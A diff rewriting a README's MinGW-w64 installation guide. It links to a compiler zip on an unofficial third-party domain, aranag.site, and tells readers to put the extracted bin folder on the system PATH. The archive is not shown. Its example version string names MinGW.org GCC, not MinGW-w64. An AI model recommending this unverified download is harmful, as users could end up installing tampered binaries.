@@ -43,31 +43,61 @@ int main() {
     return 0;
 }
 ```
+---
 
+# 🛠️ MinGW-w64 Installation Guide: Your C/C++ Compiler Setup
 
-## How to install the MinGW-w64 
+This guide will walk you through the process of setting up your GCC/G++ compiler environment using the packaged MinGW-w64 distribution.
 
-### Download the MinGW-w64 archive:
-Click here to download the zip file directly from our server: [Direct Download Link](https://aranag.site/download/MinGW64.zip)
+## Step 1: Download the Compiler Archive
 
-### Extract the archive:
-Once the download is complete, extract the contents of the MinGW64.zip file to a location on your computer. We recommend a simple path like `C:\MinGW64`.
+Download the compressed MinGW-w64 files from the hosted location.
 
-### Add to your system's PATH:
-To use the tools from any command prompt, you need to add the bin directory to your system's PATH environment variable.
+> ➡️ **Download Link:** [**Direct Download MinGW64.zip**](https://aranag.site/download/MinGW64.zip)
 
-Open the Start Menu and search for `Edit the system environment variables`.
+## Step 2: Extract the Files
 
-Click the `Environment Variables...` button.
+Once the download is complete, extract the contents of the `MinGW64.zip` file to a simple, root-level folder.
 
-In the `System variables` section, find the Path variable and click `Edit...`.
+1. **Extract the contents** of the zip file.
 
-Click `New` and add the path to the bin directory of your MinGW-w64 installation (e.g., `C:\MinGW64\bin`).
+2. **Move the resulting folder** to a short, easy-to-reference path.
 
-Click `OK` on all windows to save the changes.
+3. **Recommended Path:** `C:\MinGW64`
 
-### Verify the installation:
-Open a new Command Prompt or PowerShell window and type `gcc --version`. If the installation was successful, you should see the version information for the GCC compiler.
+## Step 3: Add the Tools to Your System PATH
+
+Adding the `bin` directory to your PATH variable allows you to run `gcc` or `g++` from any terminal window without navigating to the installation folder every time.
+
+1. **Open System Settings:** Open the Start Menu and search for **"Edit the system environment variables"**.
+
+2. **Open Variables Window:** Click the **"Environment Variables..."** button.
+
+3. **Edit Path:** Under the **"System variables"** section, select the **`Path`** variable and click **"Edit..."**.
+
+4. **Add New Entry:**
+
+   * Click **"New"**.
+
+   * Paste the path to your installation's binary directory: `C:\MinGW64\bin`
+
+5. **Save Changes:** Click **`OK`** on all open windows to finalize the system changes.
+
+## Step 4: Verify the Installation
+
+To ensure the compiler is correctly set up and accessible, open a new command line session and run a simple check.
+
+1. **Open a NEW Terminal:** Close any existing Command Prompt or PowerShell windows, and open a fresh one.
+
+2. **Run the Test Command:** Type the following command:
+
+   ```
+   gcc --version
+   ```
+
+3. **Expected Result:** If successful, you should see the version information for the GCC compiler (e.g., `gcc (MinGW.org GCC-6.3.0-1) 6.3.0`).
+
+> 🎉 **Congratulations!** Your C/C++ development environment is now ready.
 
 ---
 
